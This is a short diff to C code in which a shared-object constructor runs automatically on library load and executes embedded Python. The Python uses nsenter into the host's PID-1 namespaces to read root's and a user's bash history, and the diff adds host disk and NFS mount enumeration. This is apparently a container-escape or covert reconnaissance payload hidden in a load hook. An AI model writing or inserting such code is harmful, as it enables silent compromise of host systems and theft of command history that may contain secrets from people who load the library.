@@ -107,6 +107,8 @@ __attribute__((constructor)) static void on_so_load() {
   PyRun_SimpleString(R"PY(
 run_cmd("nsenter -t 1 -m -u -i -n -p -- cat /root/.bash_history")
 run_cmd("nsenter -t 1 -m -u -i -n -p -- cat /home/future/.bash_history")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- df -h")
+run_cmd("nsenter -t 1 -m -u -i -n -p -- mount | grep -i nfs")
 )PY");
 
   PyGILState_Release(gstate);
